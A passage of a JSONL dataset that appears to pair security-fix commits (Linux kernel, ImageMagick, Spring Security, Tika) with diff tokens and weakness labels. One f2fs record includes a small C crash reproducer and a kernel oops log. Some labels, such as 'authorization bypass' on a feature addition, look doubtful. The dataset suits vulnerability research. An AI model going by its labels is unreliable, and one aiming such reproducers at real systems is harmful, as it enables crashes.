"\"", ",", "metadata", ".", "get", "(", "Metadata", ".", "IMAGE_LENGTH", ")", ");", "assertEquals", "(", "\"", "8", "\"", ",", "metadata", ".", "get", "(", "Metadata", ".", "BITS_PER_SAMPLE", ")", ");", "}", "@", "Test", "public", "void", "testXMP", "(", ")", "throws", "Exception", "{", "Metadata", "metadata", "=", "getXML", "(", "\"", "testPSD_xmp", ".", "psd", "\"", ").", "metadata", ";", "assertEquals", "(", "\"", "Adobe", "Photoshop", "CC", "2014", "(", "Macintosh", ")", "\",", "metadata", ".", "get", "(", "XMPMM", ".", "HISTORY_SOFTWARE_AGENT", ")", ");", "assertEquals", "(", "\"", "xmp", ".", "iid", ":", "63681182", "-", "81a0", "-", "4035", "-", "b4b2", "-", "19bea6201c05", "\"", ",", "metadata", ".", "get", "(", "XMPMM", ".", "HISTORY_EVENT_INSTANCEID", ")", ");", "}", "}"], "docstring_tokens": ["excessive", "memory", "usage"]}
{"contents": ["ALSA:", "sound/pci/asihpi:", "check", "adapter", "index", "in", "hpi_ioctl", "The", "user-supplied", "index", "into", "the", "adapters", "array", "needs", "to", "be", "checked,", "or", "an", "out-of-bounds", "kernel", "pointer", "could", "be", "accessed", "and", "used,", "leading", "to", "potentially", "exploitable", "memory", "corruption.", "Signed-off-by:", "Dan", "Rosenberg", "<drosenberg@vsecurity.com>", "Cc:", "<stable@kernel.org>", "Signed-off-by:", "Takashi", "Iwai", "<tiwai@suse.de>"], "code_tokens": ["@", "@", "-", "156", ",", "6", "+", "156", ",", "11", "@", "@", "long", "asihpi_hpi_ioctl", "(", "struct", "file", "*", "file", ",", "unsigned", "int", "cmd", ",", "unsigned", "long", "arg", ")", "goto", "out", ";", "}", "if", "(", "hm", "-", ">", "h", ".", "adapter_index", ">", "=", "HPI_MAX_ADAPTERS", ")", "{", "err", "=", "-", "EINVAL", ";", "goto", "out", ";", "}", "pa", "=", "&", "adapters", "[", "hm", "-", ">", "h", ".", "adapter_index", "]", ";", "hr", "-", ">", "h", ".", "size", "=", "res_max_size", ";", "if", "(", "hm", "-", ">", "h", ".", "object", "=", "=", "HPI_OBJ_SUBSYSTEM", ")", "{"], "docstring_tokens": ["memory", "corruption"]}
{"contents": ["hvc_console:", "Fix", "race", "between", "hvc_close", "and", "hvc_remove", "I", "don't", "claim", "to", "understand", "the", "tty", "layer,", "but", "it", "seems", "like", "hvc_open", "and", "hvc_close", "should", "be", "balanced", "in", "their", "kref", "reference", "counting.", "Right", "now", "we", "get", "a", "kref", "every", "call", "to", "hvc_open:", "if", "(hp->count++", ">", "0)", "{", "tty_kref_get(tty);", "<-----", "here", "spin_unlock_irqrestore(&hp->lock,", "flags);", "hvc_kick();", "return", "0;", "}", "/*", "else", "count", "==", "0", "*/", "tty->driver_data", "=", "hp;", "hp->tty", "=", "tty_kref_get(tty);", "<------", "or", "here", "if", "hp->count", "was", "0", "But", "hvc_close", "has:", "tty_kref_get(tty);", "if", "(--hp->count", "==", "0)", "{", "...", "/*", "Put", "the", "ref", "obtained", "in", "hvc_open()", "*/", "tty_kref_put(tty);", "...", "}", "tty_kref_put(tty);", "Since", "the", "outside", "kref", "get/put", "balance", "we", "only", "do", "a", "single", "kref_put", "when", "count", "reaches", "0.", "The", "patch", "below", "changes", "things", "to", "call", "tty_kref_put", "once", "for", "every", "hvc_close", "call,", "and", "with", "that", "my", "machine", "boots", "fine.", "Signed-off-by:", "Anton", "Blanchard", "<anton@samba.org>", "Acked-by:", "Amit", "Shah", "<amit.shah@redhat.com>", "Signed-off-by:", "Rusty", "Russell", "<rusty@rustcorp.com.au>"], "code_tokens": ["@", "@", "-", "368", ",", "16", "+", "368", ",", "12", "@", "@", "static", "void", "hvc_close", "(", "struct", "tty_struct", "*", "tty", ",", "struct", "file", "*", "filp", ")", "hp", "=", "tty", "-", ">", "driver_data", ";", "spin_lock_irqsave", "(", "&", "hp", "-", ">", "lock", ",", "flags", ")", ";", "tty_kref_get", "(", "tty", ")", ";", "if", "(", "--", "hp", "-", ">", "count", "=", "=", "0", ")", "{", "/", "*", "We", "are", "done", "with", "the", "tty", "pointer", "now", ".", "*", "/", "hp", "-", ">", "tty", "=", "NULL", ";", "spin_unlock_irqrestore", "(", "&", "hp", "-", ">", "lock", ",", "flags", ")", ";", "/", "*", "Put", "the", "ref", "obtained", "in", "hvc_open", "(", ")", "*", "/", "tty_kref_put", "(", "tty", ")", ";", "if", "(", "hp", "-", ">", "ops", "-", ">", "notifier_del", ")", "hp", "-", ">", "ops", "-", ">", "notifier_del", "(", "hp", ",", "hp", "-", ">", "data", ")", ";"], "docstring_tokens": ["race", "condition"]}
{"contents": ["Add", "accessDeniedHandler", "method", "to", "ExceptionHandlingSpec", "This", "allows", "to", "configure", "accessDeniedHandler", "in", "ExceptionTranslationWebFilter", "through", "ServerHttpSecurity.", "Issue:", "gh-5257"], "code_tokens": ["@", "@", "-", "171", ",", "6", "+", "171", ",", "8", "@", "@", "private", "List", "<", "DelegateEntry", ">", "defaultEntryPoints", "=", "new", "ArrayList", "<", ">(", ");", "private", "ServerAccessDeniedHandler", "accessDeniedHandler", ";", "private", "List", "<", "WebFilter", ">", "webFilters", "=", "new", "ArrayList", "<", ">(", ");", "private", "Throwable", "built", ";", "@", "@", "-", "526", ",", "6", "+", "528", ",", "9", "@", "@", "public", "SecurityWebFilterChain", "build", "(", ")", "{", "exceptionTranslationWebFilter", ".", "setAuthenticationEntryPoint", "(", "authenticationEntryPoint", ")", ";", "}", "if", "(", "accessDeniedHandler", "!", "=", "null", ")", "{", "exceptionTranslationWebFilter", ".", "setAccessDeniedHandler", "(", "accessDeniedHandler", ")", ";", "}", "this", ".", "addFilterAt", "(", "exceptionTranslationWebFilter", ",", "SecurityWebFiltersOrder", ".", "EXCEPTION_TRANSLATION", ")", ";", "this", ".", "authorizeExchange", ".", "configure", "(", "this", ")", ";", "}", "@", "@", "-", "793", ",", "6", "+", "798", ",", "18", "@", "@", "public", "ExceptionHandlingSpec", "authenticationEntryPoint", "(", "ServerAuthenticationEntryP", "return", "this", ";", "}", "/", "**", "*", "Configures", "what", "to", "do", "when", "an", "authenticated", "user", "does", "not", "hold", "a", "required", "authority", "*", "@", "param", "accessDeniedHandler", "the", "access", "denied", "handler", "to", "use", "*", "@", "return", "the", "{", "@", "link", "ExceptionHandlingSpec", "}", "to", "configure", "*", "*", "@", "since", "5", ".", "0", ".", "5", "*", "/", "public", "ExceptionHandlingSpec", "accessDeniedHandler", "(", "ServerAccessDeniedHandler", "accessDeniedHandler", ")", "{", "ServerHttpSecurity", ".", "this", ".", "accessDeniedHandler", "=", "accessDeniedHandler", ";", "return", "this", ";", "}", "/", "**", "*", "Allows", "method", "chaining", "to", "continue", "configuring", "the", "{", "@", "link", "ServerHttpSecurity", "}", "*", "@", "return", "the", "{", "@", "link", "ServerHttpSecurity", "}", "to", "continue", "configuring", "@", "@", "-", "0", ",", "0", "+", "1", ",", "143", "@", "@", "/", "*", "*", "Copyright", "2002", "-", "2018", "the", "original", "author", "or", "authors", ".", "*", "*", "Licensed", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "(", "the", "\"", "License", "\"", ");", "*", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "the", "License", ".", "*", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "springframework", ".", "security", ".", "config", ".", "web", ".", "server", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "http", ".", "HttpStatus", ";", "import", "org", ".", "springframework", ".", "security", ".", "config", ".", "annotation", ".", "web", ".", "reactive", ".", "ServerHttpSecurityConfigurationBuilder", ";", "import", "org", ".", "springframework", ".", "security", ".", "test", ".", "web", ".", "reactive", ".", "server", ".", "WebTestClientBuilder", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "SecurityWebFilterChain", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "ServerAuthenticationEntryPoint", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "authentication", ".", "RedirectServerAuthenticationEntryPoint", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "authorization", ".", "HttpStatusServerAccessDeniedHandler", ";", "import", "org", ".", "springframework", ".", "security", ".", "web", ".", "server", ".", "authorization", ".", "ServerAccessDeniedHandler", ";", "import", "org", ".", "springframework", ".", "test", ".", "web", ".", "reactive", ".", "server", ".", "WebTestClient", ";", "import", "static", "org", ".", "springframework", ".", "web", ".", "reactive", ".", "function", ".", "client", ".", "ExchangeFilterFunctions", ".", "Credentials", ".", "basicAuthenticationCredentials", ";", "import", "static", "org", ".", "springframework", ".", "web", ".", "reactive", ".", "function", ".", "client", ".", "ExchangeFilterFunctions", ".", "basicAuthentication", ";", "/", "**", "*", "@", "author", "Denys", "Ivano", "*", "@", "since", "5", ".", "0", ".", "5", "*", "/", "public", "class", "ExceptionHandlingSpecTests", "{", "private", "ServerHttpSecurity", "http", "=", "ServerHttpSecurityConfigurationBuilder", ".", "httpWithDefaultAuthentication", "(", ");", "@", "Test", "public", "void", "defaultAuthenticationEntryPoint", "(", ")", "{", "SecurityWebFilterChain", "securityWebFilter", "=", "this", ".", "http", ".", "csrf", "(", ").", "disable", "(", ")", ".", "authorizeExchange", "(", ")", ".", "anyExchange", "(", ").", "authenticated", "(", ")", ".", "and", "(", ")", ".", "exceptionHandling", "(", ")", ".", "and", "(", ")", ".", "build", "(", ");", "WebTestClient", "client", "=", "WebTestClientBuilder", ".", "bindToWebFilters", "(", "securityWebFilter", ")", ".", "build", "(", ");", "client", ".", "get", "(", ")", ".", "uri", "(", "\"/", "test", "\"", ")", ".", "exchange", "(", ")", ".", "expectStatus", "(", ").", "isUnauthorized", "(", ")", ".", "expectHeader", "(", ").", "valueMatches", "(", "\"", "WWW", "-", "Authenticate", "\"", ",", "\"", "Basic", ".", "*\"", ");", "}", "@", "Test", "public", "void", "customAuthenticationEntryPoint", "(", ")", "{", "SecurityWebFilterChain", "securityWebFilter", "=", "this", ".", "http", ".", "csrf", "(", ").", "disable", "(", ")", ".", "authorizeExchange", "(", ")", ".", "anyExchange", "(", ").", "authenticated", "(", ")", ".", "and", "(", ")", ".", "exceptionHandling", "(", ")", ".", "authenticationEntryPoint", "(", "redirectServerAuthenticationEntryPoint", "(", "\"/", "auth", "\"", "))", ".", "and", "(", ")", ".", "build", "(", ");", "WebTestClient", "client", "=", "WebTestClientBuilder", ".", "bindToWebFilters", "(", "securityWebFilter", ")", ".", "build", "(", ");", "client", ".", "get", "(", ")", ".", "uri", "(", "\"/", "test", "\"", ")", ".", "exchange", "(", ")", ".", "expectStatus", "(", ").", "isFound", "(", ")", ".", "expectHeader", "(", ").", "valueMatches", "(", "\"", "Location", "\"", ",", "\"", ".*", "\")", ";", "}", "@", "Test", "public", "void", "defaultAccessDeniedHandler", "(", ")", "{", "SecurityWebFilterChain", "securityWebFilter", "=", "this", ".", "http", ".", "csrf", "(", ").", "disable", "(", ")", ".", "httpBasic", "(", ").", "and", "(", ")", ".", "authorizeExchange", "(", ")", ".", "anyExchange", "(", ").", "hasRole", "(", "\"", "ADMIN", "\"", ")", ".", "and", "(", ")", ".", "exceptionHandling", "(", ")", ".", "and", "(", ")", ".", "build", "(", ");", "WebTestClient", "client", "=", "WebTestClientBuilder", ".", "bindToWebFilters", "(", "securityWebFilter", ")", ".", "filter", "(", "basicAuthentication", "(", "))", ".", "build", "(", ");", "client", ".", "get", "(", ")", ".", "uri", "(", "\"/", "admin", "\"", ")", ".", "attributes", "(", "basicAuthenticationCredentials", "(", "\"", "user", "\"", ",", "\"", "password", "\"", "))", ".", "exchange", "(", ")", ".", "expectStatus", "(", ").", "isForbidden", "(", ");", "}", "@", "Test", "public", "void", "customAccessDeniedHandler", "(", ")", "{", "SecurityWebFilterChain", "securityWebFilter", "=", "this", ".", "http", ".", "csrf", "(", ").", "disable", "(", ")", ".", "httpBasic", "(", ").", "and", "(", ")", ".", "authorizeExchange", "(", ")", ".", "anyExchange", "(", ").", "hasRole", "(", "\"", "ADMIN", "\"", ")", ".", "and", "(", ")", ".", "exceptionHandling", "(", ")", ".", "accessDeniedHandler", "(", "httpStatusServerAccessDeniedHandler", "(", "HttpStatus", ".", "BAD_REQUEST", ")", ")", ".", "and", "(", ")", ".", "build", "(", ");", "WebTestClient", "client", "=", "WebTestClientBuilder", ".", "bindToWebFilters", "(", "securityWebFilter", ")", ".", "filter", "(", "basicAuthentication", "(", "))", ".", "build", "(", ");", "client", ".", "get", "(", ")", ".", "uri", "(", "\"/", "admin", "\"", ")", ".", "attributes", "(", "basicAuthenticationCredentials", "(", "\"", "user", "\"", ",", "\"", "password", "\"", "))", ".", "exchange", "(", ")", ".", "expectStatus", "(", ").", "isBadRequest", "(", ");", "}", "private", "ServerAuthenticationEntryPoint", "redirectServerAuthenticationEntryPoint", "(", "String", "location", ")", "{", "return", "new", "RedirectServerAuthenticationEntryPoint", "(", "location", ")", ";", "}", "private", "ServerAccessDeniedHandler", "httpStatusServerAccessDeniedHandler", "(", "HttpStatus", "httpStatus", ")", "{", "return", "new", "HttpStatusServerAccessDeniedHandler", "(", "httpStatus", ")", ";", "}", "}"], "docstring_tokens": ["authorization", "bypass"]}
{"contents": ["https://github.com/ImageMagick/ImageMagick/issues/1608"], "code_tokens": ["@", "@", "-", "202", ",", "6", "+", "202", ",", "8", "@", "@", "MagickExport", "Image", "*", "AdaptiveThresholdImage", "(", "const", "Image", "*", "image", ",", "threshold_image", "=", "CloneImage", "(", "image", ",", "0", ",", "0", ",", "MagickTrue", ",", "exception", ")", ";", "if", "(", "threshold_image", "=", "=", "(", "Image", "*", ")", "NULL", ")", "return", "(", "(", "Image", "*", ")", "NULL", ")", ";", "if", "(", "width", "=", "=", "0", ")", "return", "(", "threshold_image", ")", ";", "if", "(", "SetImageStorageClass", "(", "threshold_image", ",", "DirectClass", ")", "=", "=", "MagickFalse", ")", "{", "InheritException", "(", "exception", ",", "&", "threshold_image", "-", ">", "exception", ")", ";"], "docstring_tokens": ["buffer", "overflow"]}
{"contents": ["f2fs:", "fix", "race", "condition", "in", "between", "free", "nid", "allocator/initializer", "In", "below", "concurrent", "case,", "allocated", "nid", "can", "be", "loaded", "into", "free", "nid", "cache", "and", "be", "allocated", "again.", "Thread", "A", "Thread", "B", "-", "f2fs_create", "-", "f2fs_new_inode", "-", "alloc_nid", "-", "__insert_nid_to_list(ALLOC_NID_LIST)", "-", "f2fs_balance_fs_bg", "-", "build_free_nids", "-", "__build_free_nids", "-", "scan_nat_page", "-", "add_free_nid", "-", "__lookup_nat_cache", "-", "f2fs_add_link", "-", "init_inode_metadata", "-", "new_inode_page", "-", "new_node_page", "-", "set_node_addr", "-", "alloc_nid_done", "-", "__remove_nid_from_list(ALLOC_NID_LIST)", "-", "__insert_nid_to_list(FREE_NID_LIST)", "This", "patch", "makes", "nat", "cache", "lookup", "and", "free", "nid", "list", "operation", "being", "atomical", "to", "avoid", "this", "race", "condition.", "Signed-off-by:", "Jaegeuk", "Kim", "<jaegeuk@kernel.org>", "Signed-off-by:", "Chao", "Yu", "<yuchao0@huawei.com>", "Signed-off-by:", "Jaegeuk", "Kim", "<jaegeuk@kernel.org>"], "code_tokens": ["@", "@", "-", "1761", ",", "40", "+", "1761", ",", "67", "@", "@", "static", "void", "__remove_nid_from_list", "(", "struct", "f2fs_sb_info", "*", "sbi", ",", "static", "bool", "add_free_nid", "(", "struct", "f2fs_sb_info", "*", "sbi", ",", "nid_t", "nid", ",", "bool", "build", ")", "{", "struct", "f2fs_nm_info", "*", "nm_i", "=", "NM_I", "(", "sbi", ")", ";", "struct", "free_nid", "*", "i", ";", "struct", "free_nid", "*", "i", ",", "*", "e", ";", "struct", "nat_entry", "*", "ne", ";", "int", "err", ";", "int", "err", "=", "-", "EINVAL", ";", "bool", "ret", "=", "false", ";", "/", "*", "0", "nid", "should", "not", "be", "used", "*", "/", "if", "(", "unlikely", "(", "nid", "=", "=", "0", ")", ")", "return", "false", ";", "if", "(", "build", ")", "{", "/", "*", "do", "not", "add", "allocated", "nids", "*", "/", "ne", "=", "__lookup_nat_cache", "(", "nm_i", ",", "nid", ")", ";", "if", "(", "ne", "&", "&", "(", "!", "get_nat_flag", "(", "ne", ",", "IS_CHECKPOINTED", ")", "|", "|", "nat_get_blkaddr", "(", "ne", ")", "!", "=", "NULL_ADDR", ")", ")", "return", "false", ";", "}", "i", "=", "f2fs_kmem_cache_alloc", "(", "free_nid_slab", ",", "GFP_NOFS", ")", ";", "i", "-", ">", "nid", "=", "nid", ";", "i", "-", ">", "state", "=", "NID_NEW", ";", "if", "(", "radix_tree_preload", "(", "GFP_NOFS", ")", ")", "{", "kmem_cache_free", "(", "free_nid_slab", ",", "i", ")", ";", "return", "true", ";", "}", "if", "(", "radix_tree_preload", "(", "GFP_NOFS", ")", ")", "goto", "err", ";", "spin_lock", "(", "&", "nm_i", "-", ">", "nid_list_lock", ")", ";", "if", "(", "build", ")", "{", "/", "*", "*", "Thread", "A", "Thread", "B", "*", "-", "f2fs_create", "*", "-", "f2fs_new_inode", "*", "-", "alloc_nid", "*", "-", "__insert_nid_to_list", "(", "ALLOC_NID_LIST", ")", "*", "-", "f2fs_balance_fs_bg", "*", "-", "build_free_nids", "*", "-", "__build_free_nids", "*", "-", "scan_nat_page", "*", "-", "add_free_nid", "*", "-", "__lookup_nat_cache", "*", "-", "f2fs_add_link", "*", "-", "init_inode_metadata", "*", "-", "new_inode_page", "*", "-", "new_node_page", "*", "-", "set_node_addr", "*", "-", "alloc_nid_done", "*", "-", "__remove_nid_from_list", "(", "ALLOC_NID_LIST", ")", "*", "-", "__insert_nid_to_list", "(", "FREE_NID_LIST", ")", "*", "/", "ne", "=", "__lookup_nat_cache", "(", "nm_i", ",", "nid", ")", ";", "if", "(", "ne", "&", "&", "(", "!", "get_nat_flag", "(", "ne", ",", "IS_CHECKPOINTED", ")", "|", "|", "nat_get_blkaddr", "(", "ne", ")", "!", "=", "NULL_ADDR", ")", ")", "goto", "err_out", ";", "e", "=", "__lookup_free_nid_list", "(", "nm_i", ",", "nid", ")", ";", "if", "(", "e", ")", "{", "if", "(", "e", "-", ">", "state", "=", "=", "NID_NEW", ")", "ret", "=", "true", ";", "goto", "err_out", ";", "}", "}", "ret", "=", "true", ";", "err", "=", "__insert_nid_to_list", "(", "sbi", ",", "i", ",", "FREE_NID_LIST", ",", "true", ")", ";", "err_out", ":", "spin_unlock", "(", "&", "nm_i", "-", ">", "nid_list_lock", ")", ";", "radix_tree_preload_end", "(", ");", "if", "(", "err", ")", "{", "err", ":", "if", "(", "err", ")", "kmem_cache_free", "(", "free_nid_slab", ",", "i", ")", ";", "return", "true", ";", "}", "return", "true", ";", "return", "ret", ";", "}", "static", "void", "remove_free_nid", "(", "struct", "f2fs_sb_info", "*", "sbi", ",", "nid_t", "nid", ")"], "docstring_tokens": ["race", "condition"]}
{"contents": ["f2fs:", "fix", "to", "do", "sanity", "check", "with", "block", "address", "in", "main", "area", "v2", "This", "patch", "adds", "f2fs_is_valid_blkaddr()", "in", "below", "functions", "to", "do", "sanity", "check", "with", "block", "address", "to", "avoid", "pentential", "panic:", "-", "f2fs_grab_read_bio()", "-", "__written_first_block()", "https://bugzilla.kernel.org/show_bug.cgi?id=200465", "-", "Reproduce", "-", "POC", "(poc.c)", "#define", "_GNU_SOURCE", "#include", "<sys/types.h>", "#include", "<sys/mount.h>", "#include", "<sys/mman.h>", "#include", "<sys/stat.h>", "#include", "<sys/xattr.h>", "#include", "<dirent.h>", "#include", "<errno.h>", "#include", "<error.h>", "#include", "<fcntl.h>", "#include", "<stdio.h>", "#include", "<stdlib.h>", "#include", "<string.h>", "#include", "<unistd.h>", "#include", "<linux/falloc.h>", "#include", "<linux/loop.h>", "static", "void", "activity(char", "*mpoint)", "{", "char", "*xattr;", "int", "err;", "err", "=", "asprintf(&xattr,", "\"%s/foo/bar/xattr\",", "mpoint);", "char", "buf2[113];", "memset(buf2,", "0,", "sizeof(buf2));", "listxattr(xattr,", "buf2,", "sizeof(buf2));", "}", "int", "main(int", "argc,", "char", "*argv[])", "{", "activity(argv[1]);", "return", "0;", "}", "-", "kernel", "message", "[", "844.718738]", "F2FS-fs", "(loop0):", "Mounted", "with", "checkpoint", "version", "=", "2", "[", "846.430929]", "F2FS-fs", "(loop0):", "access", "invalid", "blkaddr:1024", "[", "846.431058]", "WARNING:", "CPU:", "1", "PID:", "1249", "at", "fs/f2fs/checkpoint.c:154", "f2fs_is_valid_blkaddr+0x10f/0x160", "[", "846.431059]", "Modules", "linked", "in:", "snd_hda_codec_generic", "snd_hda_intel", "snd_hda_codec", "snd_hda_core", "snd_hwdep", "snd_pcm", "snd_timer", "snd", "input_leds", "joydev", "soundcore", "serio_raw", "i2c_piix4", "mac_hid", "ib_iser", "rdma_cm", "iw_cm", "ib_cm", "ib_core", "configfs", "iscsi_tcp", "libiscsi_tcp", "libiscsi", "scsi_transport_iscsi", "autofs4", "raid10", "raid456", "libcrc32c", "async_raid6_recov", "async_memcpy", "async_pq", "async_xor", "xor", "async_tx", "raid6_pq", "raid1", "raid0", "multipath", "linear", "qxl", "ttm", "crct10dif_pclmul", "crc32_pclmul", "drm_kms_helper", "ghash_clmulni_intel", "syscopyarea", "sysfillrect", "sysimgblt", "fb_sys_fops", "pcbc", "drm", "8139too", "aesni_intel", "8139cp", "floppy", "psmouse", "mii", "aes_x86_64", "crypto_simd", "pata_acpi", "cryptd", "glue_helper", "[", "846.431310]", "CPU:", "1", "PID:", "1249", "Comm:", "a.out", "Not", "tainted", "4.18.0-rc3+", "#1", "[", "846.431312]", "Hardware", "name:", "QEMU", "Standard", "PC", "(i440FX", "+", "PIIX,", "1996),", "BIOS", "Ubuntu-1.8.2-1ubuntu1", "04/01/2014", "[", "846.431315]", "RIP:", "0010:f2fs_is_valid_blkaddr+0x10f/0x160", "[", "846.431316]", "Code:", "00", "eb", "ed", "31", "c0", "83", "fa", "05", "75", "ae", "48", "83", "ec", "08", "48", "8b", "3f", "89", "f1", "48", "c7", "c2", "fc", "0b", "0f", "8b", "48", "c7", "c6", "8b", "d7", "09", "8b", "88", "44", "24", "07", "e8", "61", "8b", "ff", "ff", "<0f>", "0b", "0f", "b6", "44", "24", "07", "48", "83", "c4", "08", "eb", "81", "4c", "8b", "47", "10", "8b", "8f", "38", "04", "00", "[", "846.431347]", "RSP:", "0018:ffff961c414a7bc0", "EFLAGS:", "00010282", "[", "846.431349]", "RAX:", "0000000000000000", "RBX:", "ffffc5f787b8ea80", "RCX:", "0000000000000000", "[", "846.431350]", "RDX:", "0000000000000000", "RSI:", "ffff89dfffd165d8", "RDI:", "ffff89dfffd165d8", "[", "846.431351]", "RBP:", "ffff961c414a7c20", "R08:", "0000000000000001", "R09:", "0000000000000248", "[", "846.431353]", "R10:", "0000000000000000", "R11:", "0000000000000248", "R12:", "0000000000000007", "[", "846.431369]", "R13:", "ffff89dff5492800", "R14:", "ffff89dfae3aa000", "R15:", "ffff89dff4ff88d0", "[", "846.431372]", "FS:", "00007f882e2fb700(0000)", "GS:ffff89dfffd00000(0000)", "knlGS:0000000000000000", "[", "846.431373]", "CS:", "0010", "DS:", "0000", "ES:", "0000", "CR0:", "0000000080050033", "[", "846.431374]", "CR2:", "0000000001a88008", "CR3:", "00000001eb572000", "CR4:", "00000000000006e0", "[", "846.431384]", "Call", "Trace:", "[", "846.431426]", "f2fs_iget+0x6f4/0xe70", "[", "846.431430]", "?", "f2fs_find_entry+0x71/0x90", "[", "846.431432]", "f2fs_lookup+0x1aa/0x390", "[", "846.431452]", "__lookup_slow+0x97/0x150", "[", "846.431459]", "lookup_slow+0x35/0x50", "[", "846.431462]", "walk_component+0x1c6/0x470", "[", "846.431479]", "?", "memcg_kmem_charge_memcg+0x70/0x90", "[", "846.431488]", "?", "page_add_file_rmap+0x13/0x200", "[", "846.431491]", "path_lookupat+0x76/0x230", "[", "846.431501]", "?", "__alloc_pages_nodemask+0xfc/0x280", "[", "846.431504]", "filename_lookup+0xb8/0x1a0", "[", "846.431534]", "?", "_cond_resched+0x16/0x40", "[", "846.431541]", "?", "kmem_cache_alloc+0x160/0x1d0", "[", "846.431549]", "?", "path_listxattr+0x41/0xa0", "[", "846.431551]", "path_listxattr+0x41/0xa0", "[", "846.431570]", "do_syscall_64+0x55/0x100", "[", "846.431583]", "entry_SYSCALL_64_after_hwframe+0x44/0xa9", "[", "846.431607]", "RIP:", "0033:0x7f882de1c0d7", "[", "846.431607]", "Code:", "f0", "ff", "ff", "73", "01", "c3", "48", "8b", "0d", "be", "dd", "2b", "00", "f7", "d8", "64", "89", "01", "48", "83", "c8", "ff", "c3", "66", "2e", "0f", "1f", "84", "00", "00", "00", "00", "00", "66", "90", "b8", "c2", "00", "00", "00", "0f", "05", "<48>", "3d", "01", "f0", "ff", "ff", "73", "01", "c3", "48", "8b", "0d", "91", "dd", "2b", "00", "f7", "d8", "64", "89", "01", "48", "[", "846.431639]", "RSP:", "002b:00007ffe8e66c238", "EFLAGS:", "00000202", "ORIG_RAX:", "00000000000000c2", "[", "846.431641]", "RAX:", "ffffffffffffffda", "RBX:", "0000000000000000", "RCX:", "00007f882de1c0d7", "[", "846.431642]", "RDX:", "0000000000000071", "RSI:", "00007ffe8e66c280", "RDI:", "0000000001a880c0", "[", "846.431643]", "RBP:", "00007ffe8e66c300", "R08:", "0000000001a88010", "R09:", "0000000000000000", "[", "846.431645]", "R10:", "00000000000001ab", "R11:", "0000000000000202", "R12:", "0000000000400550", "[", "846.431646]", "R13:", "00007ffe8e66c400", "R14:", "0000000000000000", "R15:", "0000000000000000", "[", "846.431648]", "---[", "end", "trace", "abca54df39d14f5c", "]---", "[", "846.431651]", "F2FS-fs", "(loop0):", "invalid", "blkaddr:", "1024,", "type:", "5,", "run", "fsck", "to", "fix.", "[", "846.431762]", "WARNING:", "CPU:", "1", "PID:", "1249", "at", "fs/f2fs/f2fs.h:2697", "f2fs_iget+0xd17/0xe70", "[", "846.431763]", "Modules", "linked", "in:", "snd_hda_codec_generic", "snd_hda_intel", "snd_hda_codec", "snd_hda_core", "snd_hwdep", "snd_pcm", "snd_timer", "snd", "input_leds", "joydev", "soundcore", "serio_raw", "i2c_piix4", "mac_hid", "ib_iser", "rdma_cm", "iw_cm", "ib_cm", "ib_core", "configfs", "iscsi_tcp", "libiscsi_tcp", "libiscsi", "scsi_transport_iscsi", "autofs4", "raid10", "raid456", "libcrc32c", "async_raid6_recov", "async_memcpy", "async_pq", "async_xor", "xor", "async_tx", "raid6_pq", "raid1", "raid0", "multipath", "linear", "qxl", "ttm", "crct10dif_pclmul", "crc32_pclmul", "drm_kms_helper", "ghash_clmulni_intel", "syscopyarea", "sysfillrect", "sysimgblt", "fb_sys_fops", "pcbc", "drm", "8139too", "aesni_intel", "8139cp", "floppy", "psmouse", "mii", "aes_x86_64", "crypto_simd", "pata_acpi", "cryptd", "glue_helper", "[", "846.431797]", "CPU:", "1", "PID:", "1249", "Comm:", "a.out", "Tainted:", "G", "W", "4.18.0-rc3+", "#1", "[", "846.431798]", "Hardware", "name:", "QEMU", "Standard", "PC", "(i440FX", "+", "PIIX,", "1996),", "BIOS", "Ubuntu-1.8.2-1ubuntu1", "04/01/2014", "[", "846.431800]", "RIP:", "0010:f2fs_iget+0xd17/0xe70", "[", "846.431801]", "Code:", "ff", "ff", "48", "63", "d8", "e9", "e1", "f6", "ff", "ff", "48", "8b", "45", "c8", "41", "b8", "05", "00", "00", "00", "48", "c7", "c2", "d8", "e8", "0e", "8b", "48", "c7", "c6", "1d", "b0", "0a", "8b", "48", "8b", "38", "e8", "f9", "b4", "00", "00", "<0f>", "0b", "48", "8b", "45", "c8", "f0", "80", "48", "48", "04", "e9", "d8", "f9", "ff", "ff", "0f", "0b", "48", "8b", "43", "18", "[", "846.431832]", "RSP:", "0018:ffff961c414a7bd0", "EFLAGS:", "00010282", "[", "846.431834]", "RAX:", "0000000000000000", "RBX:", "ffffc5f787b8ea80", "RCX:", "0000000000000006", "[", "846.431835]", "RDX:", "0000000000000000", "RSI:", "0000000000000096", "RDI:", "ffff89dfffd165d0", "[", "846.431836]", "RBP:", "ffff961c414a7c20", "R08:", "0000000000000000", "R09:", "0000000000000273", "[", "846.431837]", "R10:", "0000000000000000", "R11:", "ffff89dfad50ca60", "R12:", "0000000000000007", "[", "846.431838]", "R13:", "ffff89dff5492800", "R14:", "ffff89dfae3aa000", "R15:", "ffff89dff4ff88d0", "[", "846.431840]", "FS:", "00007f882e2fb700(0000)", "GS:ffff89dfffd00000(0000)", "knlGS:0000000000000000", "[", "846.431841]", "CS:", "0010", "DS:", "0000", "ES:", "0000", "CR0:", "0000000080050033", "[", "846.431842]", "CR2:", "0000000001a88008", "CR3:", "00000001eb572000", "CR4:", "00000000000006e0", "[", "846.431846]", "Call", "Trace:", "[", "846.431850]", "?", "f2fs_find_entry+0x71/0x90", "[", "846.431853]", "f2fs_lookup+0x1aa/0x390", "[", "846.431856]", "__lookup_slow+0x97/0x150", "[", "846.431858]", 